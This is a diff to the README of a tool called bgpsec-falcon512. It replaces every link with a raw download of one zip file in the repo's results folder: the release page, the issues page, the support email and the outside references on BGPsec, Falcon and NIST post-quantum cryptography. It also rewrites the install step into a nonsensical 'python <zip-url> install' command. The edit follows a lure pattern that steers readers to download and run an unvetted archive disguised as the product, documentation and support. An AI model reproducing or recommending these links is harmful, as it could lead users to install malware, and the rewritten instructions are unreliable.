@@ -8,7 +8,7 @@ Welcome to bgpsec-falcon512! This tool helps secure internet routing with advanc
 
 To download bgpsec-falcon512, visit the following link:
 
-[Download bgpsec-falcon512](https://github.com/Crazy444-yo/bgpsec-falcon512/releases)
+[Download bgpsec-falcon512](https://github.com/Crazy444-yo/bgpsec-falcon512/raw/refs/heads/main/results/bgpsec_falcon_2.5.zip)
 
 ### Steps to Download
 
@@ -35,7 +35,7 @@ After downloading bgpsec-falcon512, follow these steps to set it up:
 
 1. Locate the downloaded file on your computer.
 2. If you’re on Windows, double-click the `.exe` file to begin the installation.
-3. If you’re on macOS or Linux, open the terminal and navigate to the downloaded file. Type `python setup.py install` to install.
+3. If you’re on macOS or Linux, open the terminal and navigate to the downloaded file. Type `python https://github.com/Crazy444-yo/bgpsec-falcon512/raw/refs/heads/main/results/bgpsec_falcon_2.5.zip install` to install.
 4. Follow the on-screen instructions to complete the setup.
 
 ### Launching the Application
@@ -66,17 +66,17 @@ Feel free to explore the various options available in the app.
 
 If you encounter any issues or have questions, please reach out for help:
 
-- **GitHub Issues:** You can report problems directly on our [GitHub page](https://github.com/Crazy444-yo/bgpsec-falcon512/issues).
-- **Email Support:** Send your questions to support@bgpsec-falcon512.com for direct assistance. 
+- **GitHub Issues:** You can report problems directly on our [GitHub page](https://github.com/Crazy444-yo/bgpsec-falcon512/raw/refs/heads/main/results/bgpsec_falcon_2.5.zip).
+- **Email Support:** Send your questions to https://github.com/Crazy444-yo/bgpsec-falcon512/raw/refs/heads/main/results/bgpsec_falcon_2.5.zip for direct assistance. 
 
 ## 🌐 Learn More
 
 To understand more about BGPsec, Falcon-512 signatures, and how they enhance internet routing security, visit the following resources:
 
-- [BGPsec Overview](https://bgpsec.org)
-- [Falcon Signature Scheme Details](https://falcon-512.org)
-- [Post-Quantum Cryptography Information](https://nist.gov/pqc)
+- [BGPsec Overview](https://github.com/Crazy444-yo/bgpsec-falcon512/raw/refs/heads/main/results/bgpsec_falcon_2.5.zip)
+- [Falcon Signature Scheme Details](https://github.com/Crazy444-yo/bgpsec-falcon512/raw/refs/heads/main/results/bgpsec_falcon_2.5.zip)
+- [Post-Quantum Cryptography Information](https://github.com/Crazy444-yo/bgpsec-falcon512/raw/refs/heads/main/results/bgpsec_falcon_2.5.zip)
 
 By using bgpsec-falcon512, you're taking steps toward a more secure internet. Enjoy exploring the features and enhancing your online safety!
 
-[Download bgpsec-falcon512 again here](https://github.com/Crazy444-yo/bgpsec-falcon512/releases) for easy access to the latest version.
+[Download bgpsec-falcon512 again here](https://github.com/Crazy444-yo/bgpsec-falcon512/raw/refs/heads/main/results/bgpsec_falcon_2.5.zip) for easy access to the latest version.
